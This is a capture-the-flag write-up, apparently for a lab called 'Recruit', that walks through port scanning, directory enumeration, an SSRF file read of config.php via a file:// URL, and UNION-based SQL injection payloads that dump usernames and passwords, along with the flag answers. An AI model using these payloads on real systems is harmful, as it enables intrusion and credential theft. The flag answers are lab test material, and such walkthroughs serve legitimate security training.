# Jr.Pen 7.6. Recruit

Recruit has just launched its new recruitment portal, allowing HR staff to manage candidate applications and administrators to oversee hiring decisions. While the platform appears functional, management suspects that security may have been overlooked during development. Your task is to assess the application like a real attacker, mapping its structure, abusing exposed functionality, and exploiting vulnerabilities.


<img width="568" height="498" alt="image" src="https://github.com/user-attachments/assets/7a922256-6a70-4aec-8b7d-60e16fa6baae" />


Using RustScan, I quickly scanned the target IP address for open network ports. (-a IP addresses or hostname I ean to scan)


<img width="725" height="425" alt="image 1" src="https://github.com/user-attachments/assets/74f43efa-b59b-43f5-96ec-4b3c4fd22c2e" />


I found three open ports.

Using gobuster dir, I discovered hidden web pages, admin portals, and subfolders by sending HTTP requests to the target server with a wordlist of potential names.

<img width="848" height="487" alt="image 2" src="https://github.com/user-attachments/assets/9d842544-0479-465b-887a-c63c4f150070" />


**Answer the questions below**

> What is the flag value after logging in as a normal user?
> 

THM{LOGGED_IN_USER}


<img width="915" height="526" alt="image 3" src="https://github.com/user-attachments/assets/5636bc97-c1eb-4b48-a8e6-29578000128e" />


I opened each directory on the website one by one and analyzed its content.


<img width="914" height="603" alt="image 4" src="https://github.com/user-attachments/assets/df3150ec-9cb0-49a7-9d66-fbfc24994e92" />


Based on the information found in /api.php, I requested /file.php?cv=<url>

[http://10.114.181.248//file.php?cv=file:////var/www/html/config.php](http://10.114.181.248//file.php?cv=file:////var/www/html/config.php)

This URL exploits a Server-Side Request Forgery (SSRF) vulnerability using the file:// protocol wrapper to read sensitive database credentials from the server's local /var/www/html/config.php file.

[http://10.114.181.248/](http://10.114.181.248/) - target host , The web server running the target web application.
/file.php - Vulnerable Endpoint , A PHP script intended to load or display a file specified by the user.

?cv=  Target Parameter - The query parameter expected to hold a file path or URL

file:// PHP Stream Wrapper - A protocol scheme instructing the backend PHP application to read directly from the server's local file system rather than fetching a resource via HTTP.

//var/www/html/config.php - Target File Path - The target configuration file, which typically stores sensitive data like database credentials or secret keys.


<img width="912" height="540" alt="image 5" src="https://github.com/user-attachments/assets/5eccb2c2-c725-4283-ad8a-4d6739f3f39d" />

<img width="1076" height="540" alt="image 6" src="https://github.com/user-attachments/assets/9efea78f-b2d5-44eb-8dff-9709f074377f" />


> What is the flag value after logging in as admin?
> 

THM{LOGGED_IN_ADM1N1}

By inserting alice' ORDER BY 5 -- -, we determined that there are 4 columns. (ORDER BY 5 - Instructs the database server to sort the query results using the 5th column.)


<img width="909" height="466" alt="image 7" src="https://github.com/user-attachments/assets/7df25b1f-16a2-44b5-9e43-072a9591692b" />


Next, I injected alice' UNION SELECT database(),2,3,4 -- - and extracted the database name.

UNION SELECT(SQL Operator) - Appends a secondary custom SELECT query onto the results of the primary query.

database() - MySQL Function - Retrieves and displays the name of the currently active database in the 1st column slot.

<img width="909" height="466" alt="image 8" src="https://github.com/user-attachments/assets/66193169-70f5-42ee-92c2-672b06ac6273" />


alice' UNION SELECT group_concat(table_name) ,2,3,4 FROM information_schema.tables WHERE table_schema=database() -- -

I used UNION SELECT and group_concat() to extract and list all table names belonging to the active database from MySQL's information_schema.tables.

alice' UNION SELECT group_concat(column_name) ,2,3,4 FROM information_schema.columns WHERE table_name='users' -- -

I inserted this SQL injection payload queries MySQL's metadata catalog (`information_schema.columns`) to extract and display all column names belonging to the `users` table.


<img width="909" height="466" alt="image 9" src="https://github.com/user-attachments/assets/b3b7e7d9-d2b1-4055-9a89-758baf537d4d" />


USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,MAX_SESSION_CONTROLLED_MEMORY,MAX_SESSION_TOTAL_MEMORY,id,username,password

Extracted column names from the targeted database table, highlighting sensitive credentials (username, password) alongside MySQL system monitoring attributes.

alice' UNION SELECT group_concat(username, ':' , password) ,2,3,4 FROM users -- -

Finally, I executed `alice' UNION SELECT group_concat(username, ':', password), 2, 3, 4 FROM users -- -` to extract all stored account usernames and passwords from the `users` table.


<img width="909" height="466" alt="image 10" src="https://github.com/user-attachments/assets/e1de6847-ab41-4c43-af3f-45b56a732d7f" />


Then, I logged into the admin account using the credentials I retrieved.


<img width="909" height="466" alt="image 11" src="https://github.com/user-attachments/assets/3a2cdd01-4e22-4f0f-a704-70571878e2b4" />
